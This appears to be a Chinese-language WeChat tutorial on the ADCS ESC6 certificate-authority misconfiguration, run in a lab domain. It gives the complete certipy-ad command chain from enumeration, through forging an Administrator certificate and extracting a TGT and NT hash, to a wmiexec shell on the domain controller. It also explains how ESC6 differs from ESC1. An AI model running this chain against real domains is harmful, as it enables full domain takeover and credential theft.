---
title: ADCS-ESC6枚举和利用
url: https://mp.weixin.qq.com/s/85MNOfzVnGSDUWnviE2Aog
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:05:46.938074
---

# ADCS-ESC6枚举和利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JibvIcnkZHNfv3pn0soAJAkFSt0k8MLVqVibTtQhCibD6jkDToft6iaLibgGFZFoBUUiaocjfGJicSW4Uicq0jXN2via092wlDz4MKYv5214AMBib7cUQ/0?wx_fmt=jpeg)

# ADCS-ESC6枚举和利用

原创

Jzhoucdc周
Jzhoucdc周

攻防之路JZhoucdc

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

一.概述

问题的根源是 CA 服务器上开启了 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志。按照正常逻辑，如果用户从 Active Directory 发起证书申请，证书的“使用者替代名称（SAN）”应该由 AD 中的用户信息自动生成，用户无权修改。**但这个标志开启，就相当于告诉 CA：“允许申请人在提交的 CSR（证书签名请求）文件中，手动填写 SAN 字段的内容。”**因此，攻击者提交 CSR 时，可以在 SAN 字段里随意填入**域管理员**的 UPN（用户主体名称，即 `administrator@domain.com`）。

二.案例

枚举

```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.54.136 -vulnerable -stdout
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNcAmdnpuzesoWhtR4ASAQ1NHt4jlYvjlIrzDbhHBvaIEfmmNbxsDQRrzMIlmiaDwt7GvwKLff3qSgU4sqQXDia5Fo4lYzPY3HUmM/640?wx_fmt=png&from=appmsg)

利用

目标CA开启了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志。这个全局标志强制CA“无条件信任”请求中附带的属性（Attribute）值。

```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template User -upn Administrator@lab.local -target 10.129.54.136 -dc-ip 10.129.54.136 -debug
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNdL32pMDnVvX68VBZIf3HqQDy2ia01FsIAGwTPaU54bWicia8Qxib8cqiaWkkHsibJ7fOc4ntGlmo6SoNO1u2YjC1pTE0KRJ0WsCMpqY/640?wx_fmt=png&from=appmsg)

可以直接得到administrator.pfx，下一步拿到TGT票据和NT哈希

```
certipy-ad auth -pfx ./administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.54.136
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNfdSEzooSz1yYer2mfbF6UGbkicApqDZbnFt7SR5VmQ1h2NDJgI8tzHwpqoHo3KIaib2ITV2ez3o2IlvXIFc4XzS6QqvH0RadL8E/640?wx_fmt=png&from=appmsg)

利用票据连接DC：

```
KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass LAB-DC.LAB.LOCAL
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNf3YaetQzEklSY03UEE66dFealf8G8HXOCS5PibExicRv95xLmUhhXQicS71bQ4TZNWz2oNc0UxvrIRy7JdwUPvt3HEic2a0UN3Yx8/640?wx_fmt=png&from=appmsg)

三.ESC6和ESC1的区别

* **ESC1**：出在**证书模板（Template）**层面。模板开启了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，允许注册者（Enrollee）在申请时提供证书的**主体名称（Subject）**。
* **ESC6**：出在**CA服务器（CA Server）**全局层面。CA 开启了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 注册表标志，要求 CA 在签发证书时，必须接受请求中附带的**属性（Attribute）**里的 SAN 值。
* **ESC1**：恶意 UPN/SAN 写在 CSR（证书签名请求）的 **Extension（扩展）** 字段中。它属于证书的正式扩展部分。
* **ESC6**：恶意 UPN/SAN 写在 CSR 的 **Attribute（属性）** 字段中。它属于请求文件的附加元数据，而非证书的正式扩展结构。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/9TcGQTMQS71Y9RxBw7gPUNkibkBV22AxHU4QjFr3hERqQyWNHIiaaY3As9x7WgZrL6KZgBf16kN1gUibEyQW4akxQ/0?wx_fmt=png)

攻防之路JZhoucdc

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9TcGQTMQS71Y9RxBw7gPUNkibkBV22AxHU4QjFr3hERqQyWNHIiaaY3As9x7WgZrL6KZgBf16kN1gUibEyQW4akxQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过